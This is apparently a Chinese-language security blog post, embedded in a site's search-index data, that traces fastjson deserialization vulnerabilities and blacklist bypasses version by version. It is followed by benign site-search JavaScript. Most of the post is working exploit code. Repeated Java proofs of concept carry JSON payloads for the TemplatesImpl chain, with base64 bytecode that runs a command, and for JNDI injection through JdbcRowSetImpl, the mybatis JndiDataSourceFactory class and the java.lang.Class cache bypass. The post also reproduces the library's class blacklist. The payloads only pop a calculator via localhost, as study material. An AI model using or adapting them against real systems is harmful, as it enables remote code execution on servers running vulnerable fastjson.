\u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject jsonObject = JSON.parseObject(json, Feature.SupportNonPublicField); } } 运行后弹出计算机，这里设置了_outputProperties是为了可以调用到他的getter方法，注意一下这里的代码构造，对于byte[][]类型的数据，由于base64编码只能编码byte[]类型的数据，所以这就又加了一个数组将其转换成[][]类型的数据。\n这里就说明几个点，算是比较关键的点：\n网上有的payload没管_class变量，这是因为这个变量默认是null： 这里并没有对_tfactory变量进行赋值，这是因为如果json字符串没有对变量进行赋值，fastjson会获取这个变量的默认类型的无参构造方法进行实例化然后赋值，而这里刚好是我们需要的类型： 这里利用了一个Feature.SupportNonPublicField，这个起到了什么作用，我们在获取方法时，比如setter，其实setter基本都是private类型的变量，这里设置这个就是为了用来给私有变量进行赋值的。 这个算是比较老版本的了，可以调试跟一下，这类的过程就和前面分析的parseObject()过程是不一样了的，我们这里还需要传入另外一个Feature.SupportNonPublicField，其实是并没有调用toJSON的：\n也就和前面分析的过程不一样了，所以真正调用getter的地方并不是前面分析的toJSON()方法的序列化，而是另外的地方，基本过程在前面补充说明中，现在来看看为什么这个_outputProperties变量符合那几个条件： 变量的getter方法如下：\n返回类型为Properties.class，其父类为Hashtable，而Hashtable实现了Map接口，然后这个类没有setter方法，不是静态方法，长度大于4，完美符合，这也就是为什么在反序列化的时候调用到了getter方法从而实现了一次调用链的执行。\nJdbcRowSetImpl链 这里利用到的类是jdbcRowSetImpl类，这个类位于com.sun.rowset.JdbcRowSetImpl，简单看了一下这个类，可以看到一个可以触发jndi注入的方法：\n看一下这里有无调用connect()方法的代码，找到了一个getter：\n和一个setter：\n对于这个getter，可以想一下是否可以在反序列化的时候调用，对应变量无setter方法，返回属性为DatabaseMetaData，不满足那几个属性之一，只能放弃。那么现在着重看setter方法：\n需要conn为null，而在前面的学习中，可以知道实例化类时是调用的newInstance()，也就是会调用默认的构造方法，可以看一下这里的默认的构造方法：\n会将conn设置为null，然后再跟进connect()方法需要的参数：\n主要就是这个getDataSourceName()方法，跟进发现是返回的父类BaseRowSet的一个变量：\n还是直接赋值即可，父类存在setter方法来进行赋值：\n那么就可以尝试打一个jndi了（注意java的版本）：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) { String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/Hello\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 我这里是尝试的打rmi，基本流程就和jndi打rmi一样的，最后成功弹出计算机。\n1.2.25\u0026lt;=fastjson\u0026lt;=1.2.41 在这个版本下，加了黑白名单，具体以第一个版本，后面几个都是绕过。\npom依赖改成：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.25\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 其实就是改一下版本即可。\n可以看到加了的黑名单：\n具体的黑名单如下：\nbsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework 把com.sun包下的类都禁了，导致前面的两条链子都打不了了。\n这里再来简单看一下调用链过程，还是用前面的打jndi注入的地方来调试，主要的不同在于如下代码：\n原本我们是直接调用loadClass()方法来加载类，这里加了一个检测，跟进这里的checkAutoType()方法：\n调用栈为：\ncheckAutoType:844, ParserConfig (com.alibaba.fastjson.parser) parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) parseObject:201, JSON (com.alibaba.fastjson) main:10, Fastjson_Test (fastjson) 再看上图，autoTypeSupport默认是false，这里如果想要调用到loadClass()方法，除了不匹配到黑名单，还需要匹配到白名单，但是这里的白名单又是空： 如果不进行处理的话就不可能可以调用到loadClass()方法。但是在这个方法的处理中，可以看到有三个地方都有调用TypeUtils.loadClass()，除了上面这个，顺序分别为：\n以及：\n在最后一个图片，可以看到这里的调用都是和autoTypeSupport变量相关的，这里的expectClass变量是形参传递的，肯定为null，那么这里只要可以尝试控制autoTypeSupport为true，并且不触发黑名单，白名单不用管，反正白名单是不会触发的，本来就是一个空的。那么就可以尝试在这里进行一次加载类。\n黑名单怎么解决，当时可以尝试使用黑名单之外的类，还有另外的解法，跟进TypeUtils.loadClass()方法，有一个利用点：\n最开始我们是直接进行最下面方法的调用，然后直接返回加载的类，现在看我们这里标注出来的两个代码块：\n对于第一个，如果以[开头，就是@type键的值以[开头，就使用substring方法来截断获取[后面的方法，然后再次调用loadClass()方法来加载，但是会之类最后是放进了一个数组，后面还需要进行处理。\n对于第二个，如果对应值以L开头并且以;结尾，那么同样截取中间的内容，然后再次调用loadClass()方法来加载，这个就比较好用了，是直接返回的loadClass()处理完的数据，不用在后面的代码进行处理。\n这里我们先以第二个为例来完成一次调用，再来分析构造第一个的payload。在前面的了解中，我们可以知道离不开的变量就是autoTypeSupport，我们需要他为false，跟进这个变量的赋值：\n再看AUTO_SUPPORT变量的赋值，默认情况下就是如下代码：\n知道这里最后为false即可，怎么设置这个类的autoTypeSupport变量，在这个类其实是存在一个setter方法的，用于给这个变量赋值：\n但是我们并不能直接在json数据字符串中赋值，因为这个类也是直接从形参上定义的，简单溯源如下：\n调用的config变量的这个方法（也就是ParserConfig类的checkAutoType()方法），并且可以知道是DefaultJSONParser这个类的config变量，也是调试分析时经常出现的，溯到DefaultJSONParser类的实例化：\n对应内容为：\n形参传递就不多说了，跟一下就知道了，所以config的赋值就是这个，从中可以看出这里就是实例化了一个ParserConfig类，变量都是默认的，所以在json字符串对是不可控的，所以其实有一定的局限性的，最后的POC如下：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;Lcom.sun.rowset.JdbcRowSetImpl;\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 运行后成功弹出计算机。\n对应的TemplatesImpl如下：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\\\u0026#34;,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } 那么对于数组的形式，JdbcRowSetImpl的POC如下：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.rowset.JdbcRowSetImpl\\\u0026#34;[{,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 运行后成功弹出计算机。\nTemplatesImpl如下：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;[{,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } 然后调试一下过程即可，这里就不多说了。\n局限性还是挺大的，还需要“手动”将autoTypeSupport设置为true。\n1.2.42 xml依赖的版本改成1.2.42即可。这个版本下，数组的payload还是可以打。\n用前面的JdbcRowSetImpl链来看一下主要的不同点，还是跟进这里的checkAutoType()方法：\n这里都是使用哈希来计算的，这里大概意思就是看类名前后是否以L开头，以;结尾，是的话就使用substring()方法来进行截取，然后再进行后续的调用，然后这里的判断是用的hashCode：\n没有使用之前的字母的名单，同时这里是肯定会被ban掉的，经过处理后肯定会被匹配到黑名单从而扔出异常，绕过方法就是再加一层，因为这里只匹配一次，也就是只截取一次，而且TypeUtils.loadClass()方法并没有什么变化，双写绕过即可：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;LLcom.sun.rowset.JdbcRowSetImpl;;\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 数组格式没有影响，直接打就行了，只有L格式的使用双写绕过即可。\n简单说说这里的L过程，前面进行黑名单的判断，也是和前面分析的差不多的，就是与变量autoTypeSupport为true或者false，都会进行一次，但是都不在白名单中，所以无法直接加载，最后还是在如下进行加载的： 可以看到这里是传入的形参传递的内容，然后判断是有clazz是否为null，这里看似可以不用再调用ParserConfig.getGlobalInstance().setAutoTypeSupport(true)来进行设置值，前面我们也知道，这里的autoTypeSupport默认为false，后看有一个逻辑我们必须让这个变量为true：\n只有位true才能正常获取到想要的类，不然就会报异常从而退出。\n然后对于TypeUtils.loadClass()方法内的内容： 可以看出来是会调用三次这个loadClass()方法最后才会成功加载到类：\n后面就是熟知的过程了，这不多说。\n1.2.43 依赖改版本，然后直接定位到修改的部分，还是跟进checkAutoType()方法： 里面又套了一个if条件，意思就是如果是以LL开头，那么就直接抛出异常。\n这里的绕过方法就是前面的数组，没错，到这个版本的数组格式还是能打，最后的payload如下：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.rowset.JdbcRowSetImpl\\\u0026#34;[{,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } TemplatesImpl就是：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;[{,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } ——————\n1.2.44 同样是在checkAutoType()方法中，如下逻辑：\n前一个if是判断是否以[开头，第二个应该是判断最后是否以;结尾吧，从这里可以看出就是修复了[的payload，过滤了数组形式的payload。\n1.2.45 这个版本还存在一个黑名单绕过，但是其实是一个组件漏洞，这里利用到的是mybatis组建，需要添加依赖：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 注意修改fastjson的版本。\n其实这个漏洞基本看一下payload就懂了，利用了组件，所以算是利用另外的类，在1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.45版本只要有这个组件都能打。\nPOC如下：\n{\u0026#34;@type\u0026#34;:\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\u0026#34;,\u0026#34;properties\u0026#34;:{\u0026#34;data_source\u0026#34;:\u0026#34;rmi://127.0.0.1:1099/hello\u0026#34;}} 对应类的setter方法有jndi漏洞：\n所以构造了直接打就行了：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\\\u0026#34;,\\\u0026#34;properties\\\u0026#34;:{\\\u0026#34;data_source\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;}}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 运行弹出计算机，注意还是需要设置autoTypeSupport为true。\n1.2.47 这个算是比较重要的漏洞点了，可以不开始autoTypeSupport触发反序列化漏洞。\n影响版本：1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.47\n这里还是从1.2.47版本来分析。\n还是跟进checkAutoType()方法，其实在这个类不止最后那个需要autoTypeSupport为true才能返回加载到的clazz，如下代码：\n这里的expectClass变量默认为null，那么只要我们能在TypeUtils.getClassFromMapping()或者deserializers.findClass()找到想要利用的类，那么就可以直接在这里返回加载到的类。\n跟进这里的TypeUtils.getClassFromMapping()方法：\n可以看到是从mapping中取值，那么这个mappings是怎么进行处理的呢，重新跟了一遍流程，没看到有赋值的地方，那么肯定就是TypeUtils类的static语句在进行处理，翻看了一下这个类的static语句，可以看到如下内容： 跟进这个addBaseClassMappings()方法，里面加载了很多类（下图只是部分）： 似乎不可控，那么我们再去看deserializers.findClass()获取类的方法：\n可以看到这里想要返回clazz的话有一定条件，并且这里是与IdentityHashMap类的buckets变量有关，然后看这里的条件，需要key为Class属性。那么我们看一下这里deserializers变量的赋值逻辑，这里肯定就是与ParserConfig类有关了，这个也是之前说的形参传递的类变量，具体如下：\n调用的方法： 这次就需要跟进ParserConfig类的构造函数了，他的构造函数调用了initDeserializers()方法，这个方法内部可以看到如下内容：\n里面调用了很多方法，注意图中，是放入了一个Class.class的键，看这个对应的类，之类就是获取到这个类：\n而这个类的deserialze()方法存在一个存在一个利用点：\n这里会调用loadClass()方法，就是我们之前熟知的方法，在这里存在一个利用点： 这里的cache默认是true，所以这里会将对应的className放进mappings，并且这里的参数是可控的，从参数传递来看，这里的className就是前面的strVal变量：\n而setVal变量是由objVal变量转换来的，objVal又是从json字符串解析来的：\n是不是看到这里还有点懵，别急，为什么这里要提到deserialze()方法呢，当我们正常反序列化时，同时其实从前面的调试过程可以知道，是会获取deserializer并调用它的deserialze()方法：\n所以对应的，我们可以先尝试传入Class.class，从而获取到MiscCodec类实例，从而调用到它的deserialze()方法，从而往mappings中放入想要利用的类，从而在直接在后续中获得想要的类，如下：\n所以综上上面的思路，需要调用两次，一次放进指定类，一次加载触发反序列化，可以尝试如下构造：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) throws Exception { String json = \u0026#34;{\\\u0026#34;1\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;},\\\u0026#34;2\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}}\\n\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 运行后弹出计算机，注意是打的jndi打法。\n这里的细节就是没有设置autoTypeSupport，默认为false，那么第一个判断黑名单的就不会进入：\n而第二个判断黑名单的地方不会到达：\n直接在中间就找到直接结束了，所以也是payload中第二个可以那样设置的原因。\nTemplatesImpl的打法如下：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; public class Fastjson_Test{ public static void main(String[] args) throws Exception { String json = \u0026#34;{\\\u0026#34;1\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;},\\\u0026#34;2\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}}\\n\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } 运行后均弹出计算机。\n确实可以。\n1.2.68 而在1.2.48版本之后，在MiscCodec中修改了cache的默认值为false，并且对TypeUtils.loadClass中的mapping.put做了限制。\n改一下版本即可，这里以1.2.68版本来表示一下对1.2.47版本的限制，首先就是将cache改成false：\n其次就是。剩下的后面再学，不想看了现在。去看反序列化调用链了。具体利用可看如下文章：\nhttps://su18.org/post/fastjson-1.2.68/#charsequenceinputstream\n和nivia的文章。\n这个提高篇也可以看一看： https://xz.aliyun.com/news/12852\n参考文章：\nhttps://xz.aliyun.com/news/14309\nhttps://nivi4.notion.site/fastjson-873722f1374b4c4e99cc3283a38dfb37\nhttps://tttang.com/archive/1579/#toc_1244","date":"2026-5-6","summary":"fastjson反序列化 fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，可以序列化一个对象为json字符串们，也可以反序列化一个json字符串为一个对象，其实也就是和jackson差不多的。\n基本过程了解 在这里先来看json序列化和反序列化的过程。\n导入依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 如下就是一个简单的序列化和反序列化的过程：\npackage fastjson; import com.alibaba.fastjson.JSON; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //序列化 System.out.println(\u0026#34;=====序列化=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //反序列化 System.out.println(\u0026#34;=====反序列化=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { private String name; private int age; public Object object; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 输出为：","title":"fastjson反序列化","url":"/posts/fastjson/1/"},{"content":"Fastjson 反序列化补充 这里可以继续补充 Fastjson 反序列化相关笔记。","date":"2026-5-6","summary":"Fastjson 反序列化补充 这里可以继续补充 Fastjson 反序列化相关笔记。","title":"Fastjson 反序列化补充","url":"/posts/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]</script>
+    <script>
+      (function () {
+        var root = document.querySelector("[data-search-root]");
+        var indexNode = document.getElementById("site-search-index");
+
+        if (!root || !indexNode) {
+          return;
+        }
+
+        var input = root.querySelector("[data-search-input]");
+        var resultsBox = root.querySelector("[data-search-results]");
+
+        if (!input || !resultsBox) {
+          return;
+        }
+
+        function normalize(value) {
+          return String(value || "").toLowerCase();
+        }
+
+        var index = [];
+        try {
+          index = JSON.parse(indexNode.textContent || "[]");
+          if (typeof index === "string") {
+            index = JSON.parse(index);
+          }
+        } catch (error) {
+          index = [];
+        }
+
+        if (!Array.isArray(index)) {
+          index = [];
+        }
+
+        index = index.map(function (item) {
+          var title = normalize(item.title);
+          var summary = normalize(item.summary);
+          var content = normalize(item.content);
+
+          return Object.assign({}, item, {
+            _title: title,
+            _summary: summary,
+            _content: content,
+            _haystack: [title, summary, content].join(" ")
+          });
+        });
+
+        function clearResults() {
+          resultsBox.innerHTML = "";
+          resultsBox.hidden = true;
+          input.setAttribute("aria-expanded", "false");
+        }
+
+        function getExcerpt(item, terms) {
+          var source = String(item.summary || item.content || "").replace(/\s+/g, " ").trim();
+
+          if (!source) {
+            return "";
+          }
+
+          var normalizedSource = normalize(source);
+          var hitIndex = -1;
+
+          terms.some(function (term) {
+            hitIndex = normalizedSource.indexOf(term);
+            return hitIndex >= 0;
+          });
+
+          if (hitIndex < 0) {
+            return source.slice(0, 110) + (source.length > 110 ? "..." : "");
+          }
+
+          var start = Math.max(hitIndex - 34, 0);
+          var end = Math.min(hitIndex + 92, source.length);
+
+          return (start > 0 ? "..." : "") + source.slice(start, end) + (end < source.length ? "..." : "");
+        }
+
+        function createResult(item, terms) {
+          var link = document.createElement("a");
+          link.className = "site-search-result";
+          link.href = item.url;
+
+          var heading = document.createElement("strong");
+          heading.textContent = item.title || "未命名文章";
+          link.appendChild(heading);
+
+          var meta = document.createElement("span");
+          meta.className = "site-search-meta";
+          meta.textContent = item.date || "文章";
+          link.appendChild(meta);
